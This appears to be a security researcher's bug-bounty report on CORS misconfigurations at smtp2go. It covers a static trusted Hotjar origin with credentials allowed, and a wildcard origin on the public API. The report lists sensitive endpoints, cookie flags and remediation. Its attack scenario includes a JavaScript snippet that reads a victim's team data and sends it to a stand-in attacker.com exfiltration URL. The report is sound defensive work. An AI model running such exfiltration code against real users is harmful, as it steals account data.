# CORS Candidates — smtp2go

---

## [CORS-001] Static Third-Party ACAO + ACAC:true on All Authenticated API Endpoints

| Field | Value |
|---|---|
| **Host** | `app-us.smtp2go.com` (also `app.smtp2go.com`) |
| **Affected endpoints** | All authenticated API paths (see table below) |
| **ACAO value** | `http://insights.hotjar.com` (static — never changes) |
| **ACAC** | `true` |
| **Origin reflection** | ❌ No — hardcoded static value |
| **CSRF key required for GET** | ❌ No — most sensitive GET endpoints work without it |
| **Severity estimate** | Medium–High (conditional on `http://insights.hotjar.com` JS execution) |
| **Test status** | ❌ Not exploitable within scope |

### Behavior

The server returns `Access-Control-Allow-Origin: http://insights.hotjar.com` + `Access-Control-Allow-Credentials: true` on **every** API response, regardless of:
- Whether an `Origin` header was sent
- What `Origin` value was sent (tested: evil.com, null, suffix bypass, prefix bypass, hotjar itself)

This is NOT origin reflection — it is a **static hardcoded CORS whitelist** that permanently trusts the third-party analytics subdomain `http://insights.hotjar.com`.

Probes tested on `/api/settings/subaccounts/` (representative):
```
https://evil.com                       → ACAO: http://insights.hotjar.com  (unchanged)
null                                   → ACAO: http://insights.hotjar.com  (unchanged)
https://smtp2go.com.evil.com           → ACAO: http://insights.hotjar.com  (unchanged)
https://evilsmtp2go.com                → ACAO: http://insights.hotjar.com  (unchanged)
https://app-us.smtp2go.com_.evil.com   → ACAO: http://insights.hotjar.com  (unchanged)
https://insights.hotjar.com            → ACAO: http://insights.hotjar.com  (unchanged)
http://insights.hotjar.com             → ACAO: http://insights.hotjar.com  (unchanged)
https://sub.insights.hotjar.com        → ACAO: http://insights.hotjar.com  (unchanged)
```

### Sensitive Endpoints Readable via CORS (no CSRF key required)

All confirmed returning `status: OK` with sensitive data on simple GET + credentials:

| Endpoint | Sensitive Data Confirmed |
|---|---|
| `GET /api/settings/team/` | Email addresses, full names, roles (owner/admin), hash_id |
| `GET /api/reports/data-exports/` | Active member emails (`active_members`), display names (`active_member_names`) |
| `GET /api/dashboard/changeplan/` | `member_id` (1010395), `current_plan`, `account_status`, `card_holder_name`, `accountcode`, `end_date_epoch` |
| `GET /api/settings/verified_senders/` | Verified sender domains and email addresses, restriction info |
| `GET /api/settings/subaccounts/` | Subaccount list + plan metadata (including `subaccount_id` critical object) |
| `GET /api/settings/dedicatedips/` | Dedicated IP assignments |
| `GET /api/settings/webhooks/` | Webhook configs (URL + secrets when populated) |
| `GET /api/reports/suppression/` | Email suppression list |
| `GET /end-points/` | Full API endpoint map (entire backend surface) |

Sample data from `GET /api/settings/team/` (no CSRF, credentialed):
```json
{
  "team_members": [{
    "hash_id": "e9612426d610425186ea23827ae77d4d18325247edb42d32b2bd2c6c91024d6d",
    "username": "0xcaphe+roy@wearehackerone.com",
    "role": {"svalue": "owner", "ivalue": 8},
    "fullname": "roy kent"
  }]
}
```

Sample data from `GET /api/dashboard/changeplan/`:
```json
{
  "member_id": 1010395,
  "current_plan": 700,
  "account_status": "TRIAL",
  "card_holder_name": ""
}
```

### Attack Scenario

**Prerequisite**: JavaScript execution at `http://insights.hotjar.com`
- XSS on `insights.hotjar.com`, OR
- Subdomain takeover of `insights.hotjar.com`

**Exploit flow**:
1. Attacker serves malicious page at `http://insights.hotjar.com/poc`
2. Victim (authenticated smtp2go user) visits that page
3. Malicious JS:
   ```javascript
   fetch('https://app-us.smtp2go.com/api/settings/team/', {credentials: 'include'})
     .then(r => r.json())
     .then(d => fetch('https://attacker.com/exfil?data=' + btoa(JSON.stringify(d))))
   ```
4. Browser sends request with victim's smtp2go session cookies
5. Server responds with `ACAO: http://insights.hotjar.com` + `ACAC: true`
6. Browser allows JS to read response — team members, emails, roles exfiltrated

### Critical ACAO Note: http:// Not https://

The trusted origin is `http://insights.hotjar.com` (HTTP, not HTTPS). This means:
- An HTTPS-hosted Hotjar asset cannot directly exploit (different origin scheme)
- An HTTP-hosted page at `insights.hotjar.com` can exploit
- An HTTP page making XHR to HTTPS is NOT blocked by mixed content rules (reverse direction is blocked)

### SameSite Cookie Analysis (Exploitability Limiter)

Session cookies set by `app-us.smtp2go.com`:
```
set-cookie: session=...; HttpOnly; Path=/        (NO SameSite, NO Secure)
set-cookie: login_id=...; HttpOnly; Path=/       (NO SameSite, NO Secure)
set-cookie: 1XJgM5twoV0e8IhkwW0B...=...; HttpOnly; Path=/  (NO SameSite, NO Secure)
```

- **No `Secure` flag**: cookies can be sent over HTTP connections
- **No explicit `SameSite`**: modern browsers (Chrome 80+, Firefox 79+) default to `SameSite=Lax`
- `SameSite=Lax` blocks cross-site XHR/fetch (`withCredentials`) — limits real-browser exploitability
- Exploitable in: pre-2020 browsers, Firefox/Chrome ESR with old defaults, enterprise environments with old browsers
- `SameSite=None; Secure` would be required to explicitly allow cross-site cookies

### OPTIONS Preflight Gap

OPTIONS response to any origin returns:
```
Access-Control-Allow-Origin: http://insights.hotjar.com
allow: GET, HEAD, PUT, OPTIONS, POST
(NO Access-Control-Allow-Methods header)
```

- Missing `Access-Control-Allow-Methods` means preflighted requests FAIL even from the trusted origin
- Only simple GET requests (no custom headers) are cross-origin exploitable
- Protects POST/PUT state-changing endpoints from CORS exploitation

### Test Results

```
# Probe: curl with Origin: http://insights.hotjar.com (matching ACAO)
GET /api/settings/team/ HTTP/1.1
Host: app-us.smtp2go.com
Origin: http://insights.hotjar.com
Cookie: [session cookies]

HTTP/1.1 200 OK
access-control-allow-origin: http://insights.hotjar.com
access-control-allow-credentials: true
[... full team member data returned ...]
```

### Remediation
- Remove `Access-Control-Allow-Origin: http://insights.hotjar.com` from API responses entirely (analytics scripts don't need direct API CORS access)
- If CORS is required, restrict to `https://app-us.smtp2go.com` (same-origin) only
- Add `Secure` flag to all session cookies
- Add explicit `SameSite=Strict` or `SameSite=Lax` to session cookies
- Add `Vary: Origin` header so CDNs cache CORS responses per-origin

---

## [CORS-002] api.smtp2go.com — Wildcard ACAO on All Public API Endpoints

| Field | Value |
|---|---|
| **Host** | `api.smtp2go.com` |
| **Endpoints** | All `/v3/api/*`, `/v2/*` paths |
| **ACAO value** | `*` (wildcard) |
| **ACAC** | None (not present) |
| **Severity estimate** | Info / Low |
| **Test status** | ✅ Confirmed (by design) |

### Behavior

All endpoints on `api.smtp2go.com` return `Access-Control-Allow-Origin: *` with no ACAC. Per CORS spec, `ACAO: *` is invalid when combined with `ACAC: true` — the browser ignores it. Since there is no ACAC, credentialed requests are NOT allowed.

These are public REST API endpoints that use API key auth in the request body — no cookies. The wildcard ACAO is intentional for browser-based API integrations.

### Not Exploitable
- No `ACAC: true` → credentialed (cookie-based) cross-origin reads blocked
- Auth via API keys in POST body, not cookies
- No account data returned without valid API key

### Test Results
```
GET /v3/api/echo  → ACAO: * | ACAC: none | 200 OK (empty body)
GET /v3/status    → ACAO: * | ACAC: none | 200 OK
POST /v3/api/send → ACAO: * | ACAC: none | 404 (needs proper body)
```

---

## Session Cookie Security Issues (Supporting Finding)

Observed on all `Set-Cookie` headers from `app-us.smtp2go.com`:

| Issue | Value | Risk |
|---|---|---|
| Missing `Secure` flag | `session=...; HttpOnly; Path=/` | Cookie sent over plain HTTP |
| Missing `SameSite` attribute | Default to Lax in modern browsers | Cross-site XHR cookie blocked in modern browsers but NOT in old ones |
| ACAO uses `http://` scheme | `http://insights.hotjar.com` | Trusts insecure origin with ACAC:true |

These compound the CORS-001 risk — together they indicate the CORS policy was configured without considering HTTPS/SameSite semantics.
